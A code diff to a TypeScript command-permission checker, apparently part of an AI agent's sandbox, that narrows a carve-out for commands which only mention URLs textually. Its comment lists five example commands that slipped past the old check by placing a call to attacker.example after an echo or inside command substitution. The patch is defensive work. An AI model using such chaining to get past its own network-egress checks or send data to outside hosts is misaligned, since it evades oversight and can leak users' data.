@@ -332,9 +332,41 @@ export function extractCapabilities(
  *
  * `echo 'see https://x'` and `git commit -m '...https://x'` contact nothing.
  * The carve-out is withdrawn when the text written is then executed.
+ *
+ * SCOPED TO THE SEGMENT THAT CARRIES THE DESTINATION, not to the command.
+ * `TEXTUAL_URL_CONTEXT` is anchored to the start of what it is given, so testing
+ * it against a whole command line let a textual leading command exempt
+ * everything after it. Every one of these was ALLOWED:
+ *
+ *     echo start && python3 fetch.py https://attacker.example/x
+ *     echo hi     ; ./mytool --endpoint https://attacker.example/x
+ *     echo hi $(python3 fetch.py https://attacker.example/x)
+ *     echo hi `./upload.sh https://attacker.example/x`
+ *     git commit -m "$(./up.sh https://attacker.example/x)"
+ *
+ * The exposure was any binary outside the recognised-tool lists - including an
+ * ordinary in-workspace script - behind a separator OR inside a command
+ * substitution. `executableSegments` already sees through both, including
+ * `sh -c` bodies and nesting, so the carve-out is asked about the segment that
+ * actually names a destination rather than about the line.
+ *
+ * A segment "carries a destination" if it mentions any host at all, allowlisted
+ * or not. Filtering to untrusted hosts here would be wrong twice over: the
+ * allowlist decision belongs to `untrustedDestinations`, and withdrawing the
+ * carve-out cannot itself cause a denial - the rules still require an untrusted
+ * destination to fire.
  */
 export function isTextualUrlOnly(command: string): boolean {
-  return TEXTUAL_URL_CONTEXT.test(command) && !runsWrittenScript(command);
+  if (!TEXTUAL_URL_CONTEXT.test(command)) return false;
+  if (runsWrittenScript(command)) return false;
+
+  const carrying = executableSegments(command).filter(
+    (segment) => extractHosts(segment).length > 0 || ANY_URL.test(segment),
+  );
+  // No segment names a destination: fall back to judging the whole command,
+  // which is what the anchored test already did. Stricter, never laxer.
+  if (carrying.length === 0) return TEXTUAL_URL_CONTEXT.test(command);
+  return carrying.every((segment) => TEXTUAL_URL_CONTEXT.test(segment));
 }
 
 /** Destinations in a capability set that the run is not permitted to reach. */
